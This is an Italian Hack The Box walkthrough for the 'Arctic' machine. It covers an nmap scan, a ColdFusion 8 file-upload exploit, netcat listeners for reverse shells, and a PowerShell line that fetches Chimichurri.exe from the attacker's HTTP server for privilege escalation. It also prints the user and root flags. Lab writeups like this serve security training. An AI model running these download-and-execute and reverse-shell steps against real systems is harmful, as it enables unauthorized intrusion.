![](arctic.png)
# Arctic -Hack The Box Writeup

## Scansione nmap
```bash
nmap -sCV -O iptarget
```
navigando nelle directory ci accorgiamo che il server utilizza
## Adobe cold fusion 8
cerchiamo di inteficare un exploit di Adobe cold fusion 8
## Exploiting CVE-2009-2265 – Arbitrary File Upload
## scarichiamo lexploit 
```bash 
netcat sulla porta 9901 
nc -lnvp 9901
```
```bash
navigiamo in tolis/desktop
type user/txt
```
# Flag user 
## d329f488c7e2f9acd3b63b90cb2067a8

# Escalation privilege
cerchiamo un exploit su windows server 2008 R2
## scarichiamo da github chimichurri.exe
dalla shell che abbiamo ottenuto
```bash 
python -m http.server 8000(nella cartella Dawnloads)
```
```bash
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.130:8000/Chimichurri.exe','chimichurri.exe')"
```
```bash
avviamo netcat sulla porta 9000
nc -lnvp 9000
```
dalla shell eseguiamo 
```bash
chimichurri.exe ip e porta
```
vediamo che netcat ci da una shell
navighiamo in 
```bash
cd Users/Administrator/Desktop/root.txt
```

# Root flag 
## 229e9e35efee3fc2c4afba6e7c562592
